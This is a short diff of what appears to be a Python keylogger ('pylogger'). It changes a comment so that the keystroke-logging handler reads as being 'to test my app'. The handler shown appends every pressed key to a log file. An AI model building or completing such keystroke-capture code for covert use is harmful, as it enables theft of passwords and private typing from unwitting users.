@@ -12,7 +12,7 @@ if os.environ.get('pylogger_clean',None) is not None:
     except EnvironmentError:
         pass
 
-# on key press file
+# on key press file to test my app
 def OnKeyPress(event):
     with open(file_log,'a') as f:
         f.write(f'{event.Key}')
